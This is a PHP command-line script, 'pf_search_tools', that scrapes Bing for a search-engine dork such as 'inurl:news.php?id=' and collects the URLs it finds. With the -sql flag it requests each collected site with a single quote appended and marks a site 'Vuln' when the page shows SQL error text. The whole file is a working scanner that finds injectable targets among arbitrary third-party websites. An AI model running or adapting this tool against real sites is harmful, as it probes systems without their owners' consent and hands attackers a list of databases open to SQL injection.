<?php
/**
 * Created by PhpStorm.
 * User: PFinal南丞
 * Email: Lampxiezi@163.com
 * Date: 2020/6/9
 * Time: 15:00
 */
error_reporting(0);
set_time_limit(0);
banner();
function banner()
{
    echo "
  _____  ______ _             _ 
 |  __ \|  ____(_)           | |
 | |__) | |__   _ _ __   __ _| |
 |  ___/|  __| | | '_ \ / _` | |
 | |    | |    | | | | | (_| | |
 |_|    |_|    |_|_| |_|\__,_|_| v0.1
                                
	[+] Autor: PFinal南丞
	[+] Data: 2020/6/9
	[+] Name: pf_search_tools
	[+] Ajuda: pf_search_tools.php -h
";
}

$d = $argv[2];
if ($argv[3] != "-sql") {
    $d = $d . " " . $argv[3];
}
$dork = urlencode($d);
$urls = "https://cn.bing.com/search?q=";
$url = $urls . $dork;
$pag = array("&first=1", "&first=2", "&first=3", "&first=4", "&first=5", "&first=6", "&first=7", "&first=8", "&first=9", "&first=10");
if ($argv[1] == "-dork" or $argv[1] == "-d" && isset($argv[2])) {
    foreach ($pag as $paginacao) {
        $web = $url . $paginacao;
        $f = @fopen($web, "r");
        while ($buf = fgets($f, 1024)) {
            $buf = fgets($f, 4096);
            preg_match_all("#\b((((ht|f)tps?://)|(ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i", $buf, $match);
            for ($i = 0; $match[$i]; $i ++) {
                for ($f = 0; $match[$i][$f]; $f ++) {
                    if (isset($match[$i][$f]) && !strstr($match[$i][$f], "google") && !strstr($match[$i][$f], "microsoft") && !strstr($match[$i][$f], "youtube") && !strstr($match[$i][$f], "bing") && !strstr($match[$i][$f], "blogger") && !strstr($match[$i][$f], "yahoo") && !strstr($match[$i][$f], "facebook")) {
                        $sites = strtolower($match[$i][$f]);
                        $sites = str_replace(array("http://", "https://", "ht"), "", $match[$i][$f]);
                        if (!$sites == "") {
                            print "[*] " . $sites . "\n";
                            $fp = fopen("url.txt", "a");
                            fwrite($fp, " " . $sites . "\n");
                            $num = count(file("url.txt"));
                        }

                    }
                }
            }
        }
    }
    print "\n";
    print "___________________________________________________________________\n\n";

    echo "[+] Numero de sites encontrado {$num} \n";

    print "____________________________________________________________________\n\n";

    if ($argv[3] == "-sql") {
        print "[+] Verificando \n";
        sleep(2);
        print "[+] Verificacao 100%\n";
        print "[+] Capturando Hosts\n";
        sleep(2);
        print "[+] Hosts Capturados\n";
        print "[+] Iniciando... \n\n";

        $file = file("url.txt");
        $site = str_replace(" ", "\n", $file);
        foreach ($site as $site) {
            $site = str_replace("\n", "", $site);
            $site = str_replace("\r", "", $site);

            $caminho = "http://" . $site . "'";
            $verf = file_get_contents($caminho);

            if (strstr($verf, "error") or strstr($verf, "mysql") or strstr($verf, "syntax") or strstr($verf, "Warning") or strstr($verf, "SQL syntax")) {
                print"\n";
                print "_____________________________________________________________________\n\n";
                print "[+] Site Vuln: " . $site . "\n\n";
                print "_____________________________________________________________________\n\n";
            } else {
                print "[-] Site NOT Vuln: " . $site . "\n";
            }
        }

        $u = fopen("url.txt", "w");
        fwrite($u, "");

    }

    if ($argv[4] == "-sql") {
        print "[+] Verificando \n";
        sleep(2);
        print "[+] Verificacao 100%\n";
        print "[+] Capturando Hosts\n";
        sleep(2);
        print "[+] Hosts Capturados\n";
        print "[+] Iniciando... \n\n";

        $file = file("url.txt");
        $site = str_replace(" ", "\n", $file);
        foreach ($site as $site) {
            $site = str_replace("\n", "", $site);
            $site = str_replace("\r", "", $site);

            $caminho = "http://" . $site . "'";
            $verf = file_get_contents($caminho);

            if (strstr($verf, "error") or strstr($verf, "mysql") or strstr($verf, "syntax") or strstr($verf, "Warning") or strstr($verf, "SQL syntax")) {
                print"\n";
                print "_____________________________________________________________________\n\n";
                print "[+] Site Vuln: " . $site . "\n\n";
                print "_____________________________________________________________________\n\n";
            } else {
                print "[-] Site NOT Vuln: " . $site . "\n";
            }
        }

        $u = fopen("url.txt", "w");
        fwrite($u, "");
    }
} else {
    echo "Syntax : php $argv[0] -d inurl:news.php?id=";
    exit;
}

if ($argv[1] == "-h" or $argv[1] == "-help") {
    echo "
OPTIONS[-dork, -sql, -h]
    -dork    关键词
    -sql     检查SQL漏洞注入
    -h       帮助
exemplos:
	   pf_search_tools.php -dork inurl:news.php?id=
	   pf_search_tools.php -dork inurl:news.php?id= -sql
	   pf_search_tools.php -dork inurl:news.php?id= site:firday-go.cc -sql
\n";
}

